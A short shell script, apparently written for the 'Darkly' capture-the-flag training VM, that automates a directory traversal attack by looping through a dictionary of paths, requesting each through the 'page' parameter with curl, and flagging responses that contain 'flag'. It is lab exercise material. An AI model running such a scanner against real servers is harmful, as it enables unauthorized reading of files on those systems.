#!/bin/sh

## script to perfom a directory traversal attack with well known paths

if [ -z "$1" ]
  then
    echo "No argument supplied";
    echo "Usage : ./getflag.sh [ip_addr]"
    echo "[ip_addr] = your darkly VM's IP (example : 192.168.122.49)"
	exit 1
fi

verbose=0
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
paths='dictionnary.txt'

if [ -n $2 ] && [ "$2" = "-v" ]; then
	verbose="1"
fi

	while read path; do 
	# -s for silent mode (curl) and -c to count occurences (grep)
	res=$(curl -s "http://$1/?page=${path}" | grep -c "flag")
	if [ $res = "1" ]; then
		echo "${GREEN}GOTCHA${NC}	: ${YELLOW}$path"
		exit 0
	elif [ "$verbose" = "1" ];then
		echo "${RED}FAIL${NC}	- $path"
	fi
	done < $paths

